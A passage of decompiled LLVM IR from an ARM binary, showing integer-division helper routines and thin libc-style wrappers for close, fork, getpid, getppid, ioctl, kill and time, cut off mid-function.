  %v2_c918 = phi i32 [ %v0_c904, %dec_label_pc_c8f0 ], [ %v3_c910, %bb88 ]
  %v1_c918 = phi i32 [ %v1_c900, %dec_label_pc_c8f0 ], [ %v0_c91455, %bb88 ]
  %v3_c914 = icmp ult i32 %v1_c918, %v2_c918
  br i1 %v3_c914, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_c914
  %v2_c914 = sub i32 %v1_c918, %v2_c918
  br label %bb76

dec_label_pc_c920:                                ; preds = %dec_label_pc_c864
  %v0_c920 = load i32, i32* @lr, align 4
  %v0_c924 = call i32 @function_ca14()
  call void @__pseudo_branch(i32 %v0_c920)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c918, { 1, 2, 0 }
  uselistorder i32 %v0_c904, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_c8e4, { 1, 0, 2 }
  uselistorder i32 %v7_c8dc, { 1, 0 }
  uselistorder i32 %v3_c8d8, { 1, 0 }
  uselistorder i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_c8cc, { 1, 0 }
  uselistorder i32 %v4_c8c4, { 1, 0 }
  uselistorder i32 %v4_c8bc, { 1, 0 }
  uselistorder i32 %v6_c8dc, { 3, 0, 2, 1 }
  uselistorder i32 %v2_c8ac, { 1, 0 }
  uselistorder i32 %v1_c8a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_c88c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_c898.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c86c, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_c908, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_c8b4, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_c930(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c930:
  store i32 %arg1, i32* @r0, align 4
  %v2_c930 = icmp eq i32 %arg2, 0
  br i1 %v2_c930, label %dec_label_pc_ca04, label %dec_label_pc_c938

dec_label_pc_c938:                                ; preds = %dec_label_pc_c930
  %v1_c930 = icmp slt i32 %arg2, 0
  br i1 %v1_c930, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_c938
  %v2_c938 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_c938, %bb
  %v4_c950 = phi i32 [ %arg2, %dec_label_pc_c938 ], [ %v2_c938, %bb ]
  %v0_c93c = load i32, i32* @r0, align 4
  %v1_c93c = icmp slt i32 %v0_c93c, 0
  br i1 %v1_c93c, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_c940 = sub i32 0, %v0_c93c
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_c948 = phi i32 [ %v0_c93c, %bb79 ], [ %v2_c940, %bb80 ]
  %v1_c944 = add i32 %v4_c950, -1
  %v7_c944 = icmp eq i32 %v4_c950, 1
  br i1 %v7_c944, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_c948 = icmp eq i32 %v1_c948, %v4_c950
  br i1 %v10_c948, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_c948 = icmp ult i32 %v1_c948, %v4_c950
  br i1 %v4_c948, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_c950 = and i32 %v1_c944, %v4_c950
  %v8_c950 = icmp eq i32 %v6_c950, 0
  br i1 %v8_c950, label %.thread72, label %dec_label_pc_c960.preheader

dec_label_pc_c960.preheader:                      ; preds = %bb84
  %v2_c960109 = icmp ugt i32 %v4_c950, 268435455
  br i1 %v2_c960109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_c95464 = phi i32 [ %v1_c948, %bb84 ], [ 0, %.thread70 ]
  %v3_c954 = and i32 %v1_c95464, %v1_c944
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_c960.preheader
  %v0_c974.pr35.lcssa = phi i32 [ %v4_c950, %dec_label_pc_c960.preheader ], [ %v4_c968, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_c960.preheader ], [ %v2_c96c9, %.thread2.thread7 ]
  br label %dec_label_pc_c974thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_c960.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_c96c9, %.thread2.thread7 ], [ 0, %dec_label_pc_c960.preheader ]
  %v0_c974.pr35110 = phi i32 [ %v4_c968, %.thread2.thread7 ], [ %v4_c950, %dec_label_pc_c960.preheader ]
  %v4_c964 = icmp ult i32 %v0_c974.pr35110, %v1_c948
  br i1 %v4_c964, label %bb86, label %dec_label_pc_c974thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_c968 = and i32 %v0_c974.pr35110, 268435456
  %v3_c968 = icmp eq i32 %v2_c968, 0
  %v4_c968 = mul i32 %v0_c974.pr35110, 16
  br i1 %v3_c968, label %.thread2.thread7, label %dec_label_pc_c974.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_c96c9 = add i32 %storemerge111, 4
  %v2_c960 = icmp ugt i32 %v4_c968, 268435455
  br i1 %v2_c960, label %.thread1, label %bb85

dec_label_pc_c974thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_c974thread-pre-split.loopexit

dec_label_pc_c974thread-pre-split.loopexit:       ; preds = %dec_label_pc_c974thread-pre-split.loopexit.loopexit, %.thread1
  %v0_c974.pr35108 = phi i32 [ %v0_c974.pr35.lcssa, %.thread1 ], [ %v0_c974.pr35110, %dec_label_pc_c974thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_c974thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_c974thread-pre-split

dec_label_pc_c974thread-pre-split:                ; preds = %.thread4, %dec_label_pc_c974thread-pre-split.loopexit
  %v1_c98041 = phi i32 [ %storemerge105, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v2_c980, %.thread4 ]
  %v2_c97836 = phi i32 [ %v1_c948, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v2_c978, %.thread4 ]
  %v0_c974.pr = phi i32 [ %v0_c974.pr35108, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v3_c97c, %.thread4 ]
  br label %dec_label_pc_c974

dec_label_pc_c974.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_c974.loopexit, %dec_label_pc_c974thread-pre-split
  %v0_c988.pr = phi i32 [ %v1_c98041, %dec_label_pc_c974thread-pre-split ], [ %storemerge111, %dec_label_pc_c974.loopexit ]
  %v2_c978 = phi i32 [ %v2_c97836, %dec_label_pc_c974thread-pre-split ], [ %v1_c948, %dec_label_pc_c974.loopexit ]
  %v1_c97c = phi i32 [ %v0_c974.pr, %dec_label_pc_c974thread-pre-split ], [ %v4_c968, %dec_label_pc_c974.loopexit ]
  %v2_c974 = icmp slt i32 %v1_c97c, 0
  br i1 %v2_c974, label %dec_label_pc_c988, label %bb87

bb87:                                             ; preds = %dec_label_pc_c974
  %v4_c978 = icmp ult i32 %v1_c97c, %v2_c978
  br i1 %v4_c978, label %.thread4, label %dec_label_pc_c988

.thread4:                                         ; preds = %bb87
  %v3_c97c = mul i32 %v1_c97c, 2
  %v2_c980 = add i32 %v0_c988.pr, 1
  br label %dec_label_pc_c974thread-pre-split

dec_label_pc_c988:                                ; preds = %bb87, %dec_label_pc_c974
  %v2_c988 = add i32 %v0_c988.pr, -3
  %v5_c98c = icmp slt i32 %v0_c988.pr, 3
  br i1 %v5_c98c, label %dec_label_pc_c9cc, label %dec_label_pc_c990

dec_label_pc_c990:                                ; preds = %dec_label_pc_c988, %bb91
  %v6_c9b8 = phi i32 [ %v0_c9c0, %bb91 ], [ %v2_c988, %dec_label_pc_c988 ]
  %v1_c994 = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %bb91 ], [ %v2_c978, %dec_label_pc_c988 ]
  %v3_c9b410 = phi i32 [ %v3_c9b4, %bb91 ], [ %v1_c97c, %dec_label_pc_c988 ]
  %v3_c990 = icmp ult i32 %v1_c994, %v3_c9b410
  %v3_c994 = select i1 %v3_c990, i32 0, i32 %v3_c9b410
  %v1_c99c = sub i32 %v1_c994, %v3_c994
  %v4_c998 = udiv i32 %v3_c9b410, 2
  %v6_c998 = icmp ult i32 %v1_c99c, %v4_c998
  %v6_c99c = select i1 %v6_c998, i32 0, i32 %v4_c998
  %v1_c99c.v6_c99c = sub i32 %v1_c99c, %v6_c99c
  %.demorgan = and i1 %v3_c990, %v6_c998
  %v4_c9a0 = udiv i32 %v3_c9b410, 4
  %v6_c9a0 = icmp ult i32 %v1_c99c.v6_c99c, %v4_c9a0
  %v6_c9a4 = select i1 %v6_c9a0, i32 0, i32 %v4_c9a0
  %v1_c99c.v6_c99c.v6_c9a4 = sub i32 %v1_c99c.v6_c99c, %v6_c9a4
  %.demorgan76 = and i1 %.demorgan, %v6_c9a0
  %v4_c9a8 = udiv i32 %v3_c9b410, 8
  %v6_c9a8 = icmp ult i32 %v1_c99c.v6_c99c.v6_c9a4, %v4_c9a8
  %v6_c9ac = select i1 %v6_c9a8, i32 0, i32 %v4_c9a8
  %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac = sub i32 %v1_c99c.v6_c99c.v6_c9a4, %v6_c9ac
  %.demorgan77 = and i1 %.demorgan76, %v6_c9a8
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_c990
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_c990, %bb88
  %v2_c9b0 = add i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, -1
  %v4_c9b0 = sub i32 0, %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac
  %v5_c9b0 = and i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %v4_c9b0
  %v3_c9b4 = udiv i32 %v3_c9b410, 16
  %v5_c9b8 = icmp slt i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, 1
  br i1 %v5_c9b8, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_c9b8 = add i32 %v6_c9b8, -4
  %v9_c9b8 = sub i32 3, %v6_c9b8
  %v10_c9b8 = and i32 %v9_c9b8, %v6_c9b8
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_c9c0 = phi i32 [ %v6_c9b8, %bb89 ], [ %v7_c9b8, %bb90 ]
  %v0_c9bc13.in = phi i32 [ %v2_c9b0, %bb89 ], [ %v7_c9b8, %bb90 ]
  %v1_c9bc12.in = phi i32 [ %v5_c9b0, %bb89 ], [ %v10_c9b8, %bb90 ]
  %v1_c9bc12 = icmp slt i32 %v1_c9bc12.in, 0
  %v0_c9bc13 = icmp slt i32 %v0_c9bc13.in, 0
  %v2_c9bc = xor i1 %v0_c9bc13, %v1_c9bc12
  br i1 %v2_c9bc, label %dec_label_pc_c9c0, label %dec_label_pc_c990

dec_label_pc_c9c0:                                ; preds = %bb91
  %v1_c9c0 = urem i32 %v0_c9c0, 4
  %v2_c9c0 = icmp eq i32 %v1_c9c0, 0
  br i1 %v2_c9c0, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_c9c0
  %v3_c9c4 = icmp eq i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, 0
  br i1 %v3_c9c4, label %.thread6, label %dec_label_pc_c9cc

dec_label_pc_c9cc:                                ; preds = %bb92, %dec_label_pc_c988
  %v0_c9e0 = phi i32 [ %v3_c9b4, %bb92 ], [ %v1_c97c, %dec_label_pc_c988 ]
  %v1_c9dc = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %bb92 ], [ %v2_c978, %dec_label_pc_c988 ]
  %v0_c9cc = phi i32 [ %v0_c9c0, %bb92 ], [ %v2_c988, %dec_label_pc_c988 ]
  %v5_c9d0 = icmp slt i32 %v0_c9cc, -2
  br i1 %v5_c9d0, label %dec_label_pc_c9f0, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c9cc
  %v8_c9cc = icmp eq i32 %v0_c9cc, -2
  br i1 %v8_c9cc, label %dec_label_pc_c9e4, label %dec_label_pc_c9d8

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c9d4
  %v3_c9d8 = icmp ult i32 %v1_c9dc, %v0_c9e0
  br i1 %v3_c9d8, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_c9d8
  %v2_c9d8 = sub i32 %v1_c9dc, %v0_c9e0
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_c9d8, %bb93
  %v0_c9e454 = phi i32 [ %v1_c9dc, %dec_label_pc_c9d8 ], [ %v2_c9d8, %bb93 ]
  %v3_c9e0 = udiv i32 %v0_c9e0, 2
  br label %dec_label_pc_c9e4

dec_label_pc_c9e4:                                ; preds = %dec_label_pc_c9d4, %bb94
  %v0_c9ec = phi i32 [ %v0_c9e0, %dec_label_pc_c9d4 ], [ %v3_c9e0, %bb94 ]
  %v1_c9e8 = phi i32 [ %v1_c9dc, %dec_label_pc_c9d4 ], [ %v0_c9e454, %bb94 ]
  %v3_c9e4 = icmp ult i32 %v1_c9e8, %v0_c9ec
  br i1 %v3_c9e4, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_c9e4
  %v2_c9e4 = sub i32 %v1_c9e8, %v0_c9ec
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_c9e4, %bb95
  %v0_c9f057 = phi i32 [ %v1_c9e8, %dec_label_pc_c9e4 ], [ %v2_c9e4, %bb95 ]
  %v3_c9ec = udiv i32 %v0_c9ec, 2
  br label %dec_label_pc_c9f0

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9cc, %bb96
  %v2_c9f4 = phi i32 [ %v0_c9e0, %dec_label_pc_c9cc ], [ %v3_c9ec, %bb96 ]
  %v1_c9f4 = phi i32 [ %v1_c9dc, %dec_label_pc_c9cc ], [ %v0_c9f057, %bb96 ]
  %v3_c9f0 = icmp ult i32 %v1_c9f4, %v2_c9f4
  br i1 %v3_c9f0, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_c9f0
  %v2_c9f0 = sub i32 %v1_c9f4, %v2_c9f4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_c9f0, %bb83, %.thread72, %dec_label_pc_c9c0, %bb92, %bb97
  %v1_c9fc = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %dec_label_pc_c9c0 ], [ 0, %bb92 ], [ %v1_c9f4, %dec_label_pc_c9f0 ], [ %v2_c9f0, %bb97 ], [ %v3_c954, %.thread72 ], [ %v1_c948, %bb83 ]
  br i1 %v1_c93c, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_c9fc = sub i32 0, %v1_c9fc
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_ca00 = phi i32 [ %v1_c9fc, %.thread6 ], [ %v2_c9fc, %bb98 ]
  ret i32 %v1_ca00

dec_label_pc_ca04:                                ; preds = %dec_label_pc_c930
  %v0_ca04 = load i32, i32* @lr, align 4
  %v0_ca08 = call i32 @function_ca14()
  call void @__pseudo_branch(i32 %v0_ca04)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_c9e0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_c9c0, { 1, 0, 2 }
  uselistorder i32 %v7_c9b8, { 1, 0 }
  uselistorder i32 %v3_c9b4, { 1, 0 }
  uselistorder i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_c9a8, { 1, 0 }
  uselistorder i32 %v4_c9a0, { 1, 0 }
  uselistorder i32 %v4_c998, { 1, 0 }
  uselistorder i32 %v6_c9b8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_c988, { 1, 0 }
  uselistorder i32 %v1_c97c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_c978, { 1, 0, 3, 2 }
  uselistorder i32 %v4_c968, { 1, 0, 3, 2 }
  uselistorder i32 %v0_c974.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c948, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_c950, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_c9e4, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_c990, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_ca14() local_unnamed_addr {
dec_label_pc_ca14:
  %v1_ca14 = load i32, i32* @r0, align 4
  ret i32 %v1_ca14
}

define i32 @function_ca18(i32 %arg1) local_unnamed_addr {
dec_label_pc_ca18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca18 = load i32, i32* @r4, align 4
  store i32 %v3_ca18, i32* %stack_var_-8, align 4
  %v1_ca1c = call i32 @close(i32 %arg1)
  store i32 %v1_ca1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_ca1c, -4095
  br i1 %tmp, label %dec_label_pc_ca3c, label %dec_label_pc_ca2c

dec_label_pc_ca2c:                                ; preds = %dec_label_pc_ca18
  %v0_ca2c = call i32 @function_cc08()
  %v0_ca30 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca30 = sub i32 0, %v0_ca30
  %v2_ca34 = inttoptr i32 %v0_ca2c to i32*
  store i32 %v1_ca30, i32* %v2_ca34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca3c

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_ca18, %dec_label_pc_ca2c
  %v0_ca3c = phi i32 [ %v1_ca1c, %dec_label_pc_ca18 ], [ -1, %dec_label_pc_ca2c ]
  %v2_ca40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca40, i32* @r4, align 4
  ret i32 %v0_ca3c

; uselistorder directives
  uselistorder i32 %v1_ca1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca3c, { 1, 0 }
}

define i32 @function_ca44(i32 %arg1) local_unnamed_addr {
dec_label_pc_ca44:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca44 = load i32, i32* @r4, align 4
  store i32 %v3_ca44, i32* %stack_var_-8, align 4
  %v0_ca48 = call i32 @fork()
  store i32 %v0_ca48, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ca48, -4095
  br i1 %tmp, label %dec_label_pc_ca68, label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca44
  %v0_ca58 = call i32 @function_cc08()
  %v0_ca5c = load i32, i32* %r4.global-to-local, align 4
  %v1_ca5c = sub i32 0, %v0_ca5c
  %v2_ca60 = inttoptr i32 %v0_ca58 to i32*
  store i32 %v1_ca5c, i32* %v2_ca60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_ca58
  %v0_ca68 = phi i32 [ %v0_ca48, %dec_label_pc_ca44 ], [ -1, %dec_label_pc_ca58 ]
  %v2_ca6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca6c, i32* @r4, align 4
  ret i32 %v0_ca68

; uselistorder directives
  uselistorder i32 %v0_ca48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca68, { 1, 0 }
}

define i32 @function_ca70() local_unnamed_addr {
dec_label_pc_ca70:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca70 = load i32, i32* @r4, align 4
  store i32 %v3_ca70, i32* %stack_var_-8, align 4
  %v0_ca74 = call i32 @getpid()
  store i32 %v0_ca74, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ca74, -4095
  br i1 %tmp, label %dec_label_pc_ca94, label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca70
  %v0_ca84 = call i32 @function_cc08()
  %v0_ca88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca88 = sub i32 0, %v0_ca88
  %v2_ca8c = inttoptr i32 %v0_ca84 to i32*
  store i32 %v1_ca88, i32* %v2_ca8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca94

dec_label_pc_ca94:                                ; preds = %dec_label_pc_ca70, %dec_label_pc_ca84
  %v0_ca94 = phi i32 [ %v0_ca74, %dec_label_pc_ca70 ], [ -1, %dec_label_pc_ca84 ]
  %v2_ca98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca98, i32* @r4, align 4
  ret i32 %v0_ca94

; uselistorder directives
  uselistorder i32 %v0_ca74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca94, { 1, 0 }
}

define i32 @function_ca9c() local_unnamed_addr {
dec_label_pc_ca9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca9c = load i32, i32* @r4, align 4
  store i32 %v3_ca9c, i32* %stack_var_-8, align 4
  %v0_caa0 = call i32 @getppid()
  store i32 %v0_caa0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_caa0, -4095
  br i1 %tmp, label %dec_label_pc_cac0, label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca9c
  %v0_cab0 = call i32 @function_cc08()
  %v0_cab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cab4 = sub i32 0, %v0_cab4
  %v2_cab8 = inttoptr i32 %v0_cab0 to i32*
  store i32 %v1_cab4, i32* %v2_cab8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca9c, %dec_label_pc_cab0
  %v0_cac0 = phi i32 [ %v0_caa0, %dec_label_pc_ca9c ], [ -1, %dec_label_pc_cab0 ]
  %v2_cac4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cac4, i32* @r4, align 4
  ret i32 %v0_cac0

; uselistorder directives
  uselistorder i32 %v0_caa0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
}

define i32 @function_cac8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cac8:
  %r4.global-to-local = alloca i32, align 4
  %v2_cae4 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_cae4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cae4, -4095
  br i1 %tmp, label %dec_label_pc_cb04, label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cac8
  %v0_caf4 = call i32 @function_cc08()
  %v0_caf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_caf8 = sub i32 0, %v0_caf8
  %v2_cafc = inttoptr i32 %v0_caf4 to i32*
  store i32 %v1_caf8, i32* %v2_cafc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cac8, %dec_label_pc_caf4
  %v0_cb04 = phi i32 [ %v2_cae4, %dec_label_pc_cac8 ], [ -1, %dec_label_pc_caf4 ]
  ret i32 %v0_cb04

; uselistorder directives
  uselistorder i32 %v2_cae4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb04, { 1, 0 }
}

define i32 @function_cb18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cb18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb18 = load i32, i32* @r4, align 4
  store i32 %v3_cb18, i32* %stack_var_-8, align 4
  %v2_cb1c = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_cb1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cb1c, -4095
  br i1 %tmp, label %dec_label_pc_cb3c, label %dec_label_pc_cb2c

dec_label_pc_cb2c:                                ; preds = %dec_label_pc_cb18
  %v0_cb2c = call i32 @function_cc08()
  %v0_cb30 = load i32, i32* %r4.global-to-local, align 4
  %v1_cb30 = sub i32 0, %v0_cb30
  %v2_cb34 = inttoptr i32 %v0_cb2c to i32*
  store i32 %v1_cb30, i32* %v2_cb34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb18, %dec_label_pc_cb2c
  %v0_cb3c = phi i32 [ %v2_cb1c, %dec_label_pc_cb18 ], [ -1, %dec_label_pc_cb2c ]
  %v2_cb40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cb40, i32* @r4, align 4
  ret i32 %v0_cb3c

; uselistorder directives
  uselistorder i32 %v2_cb1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb3c, { 1, 0 }
}

define i32 @function_cb44(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_cb44:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb44 = load i32, i32* @r4, align 4
  store i32 %v3_cb44, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cb6c, label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb44
  %v0_cb5c = call i32 @function_cc08()
  %v0_cb60 = load i32, i32* %r4.global-to-local, align 4
  %v1_cb60 = sub i32 0, %v0_cb60
  %v2_cb64 = inttoptr i32 %v0_cb5c to i32*
  store i32 %v1_cb60, i32* %v2_cb64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_cb70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cb6c

dec_label_pc_cb6c:                                ; preds = %dec_label_pc_cb44, %dec_label_pc_cb5c
  %v2_cb70 = phi i32 [ %v3_cb44, %dec_label_pc_cb44 ], [ %v2_cb70.pre, %dec_label_pc_cb5c ]
  %v0_cb6c = phi i32 [ %arg1, %dec_label_pc_cb44 ], [ -1, %dec_label_pc_cb5c ]
  store i32 %v2_cb70, i32* @r4, align 4
  ret i32 %v0_cb6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb6c, { 1, 0 }
}

define i32 @function_cb74(i32* %arg1) local_unnamed_addr {
dec_label_pc_cb74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb74 = load i32, i32* @r4, align 4
  store i32 %v3_cb74, i32* %stack_var_-8, align 4
  %v2_cb78 = call i32 @time(i32* %arg1)
  store i32 %v2_cb78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cb78, -4095
  br i1 %tmp, label %dec_label_pc_cb98, label %dec_label_pc_cb88

dec_label_pc_cb88:                                ; preds = %dec_label_pc_cb74
  %v0_cb88 = call i32 @function_cc08()
  %v0_cb8c = load i32, i32* %r4.global-to-local, align 4
  %v1_cb8c = sub i32 0, %v0_cb8c
  %v2_cb90 = inttoptr i32 %v0_cb88 to i32*
  store i32 %v1_cb8c, i32* %v2_cb90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb74, %dec_label_pc_cb88
  %v0_cb98 = phi i32 [ %v2_cb78, %dec_label_pc_cb74 ], [ -1, %dec_label_pc_cb88 ]
  %v2_cb9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cb9c, i32* @r4, align 4
  ret i32 %v0_cb98

; uselistorder directives
  uselistorder i32 %v2_cb78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb98, { 1, 0 }
}

define i32 @function_cba0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cba0:
  store i32 0, i32* @r3, align 4
  %v0_cba4 = call i32 @function_10fd8()
  ret i32 %v0_cba4
}

define i32 @function_cba8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_cba8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cba8 = load i32, i32* @r4, align 4
  store i32 %v3_cba8, i32* %stack_var_-8, align 4
